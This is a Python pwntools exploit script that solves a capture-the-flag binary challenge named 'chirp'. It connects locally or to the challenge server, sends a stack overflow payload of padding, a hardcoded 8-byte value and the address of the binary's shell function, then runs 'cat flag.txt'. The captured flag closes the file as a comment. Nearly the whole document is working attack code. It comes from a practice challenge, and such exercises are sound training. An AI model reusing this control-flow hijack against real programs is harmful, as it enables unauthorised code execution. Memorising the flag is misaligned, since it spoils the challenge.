#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "chirp.challs.pwnoh.io"
exe = context.binary = ELF('./chirp', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl=True)
else:
    p = exe.process()


# VARIABLE
main = exe.sym.main

# PAYLOAD
payload = b'\0'*0x18
payload += p64(0x9114730499870181)
payload += b'\0'*8
payload += p64(exe.sym.shell)
p.sendlineafter(b'name: ', payload)

p.sendline(b'cat flag.txt')

p.interactive()

# bctf{r3Al_pR0gramm3rs_d0n7_Wr1t3_th31R_0wn_cRypTo}